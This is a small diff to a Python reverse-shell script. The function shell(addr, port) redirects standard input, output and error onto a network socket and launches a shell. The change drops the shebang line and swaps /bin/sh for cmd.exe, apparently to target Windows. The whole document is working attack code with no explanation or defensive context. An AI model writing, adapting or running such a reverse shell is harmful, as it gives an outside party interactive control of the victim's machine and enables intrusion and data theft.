@@ -1,5 +1,3 @@
-#! /bin/python
-
 import subprocess, os, sys, socket
 
 def shell(addr, port):
@@ -8,7 +6,7 @@ def shell(addr, port):
 	os.dup2(sock.fileno(), 0)
 	os.dup2(sock.fileno(), 1)
 	os.dup2(sock.fileno(), 2)
-	subprocess.call(["/bin/sh"])
+	subprocess.call(["cmd.exe"])
 	sock.close()
 	
 def main():
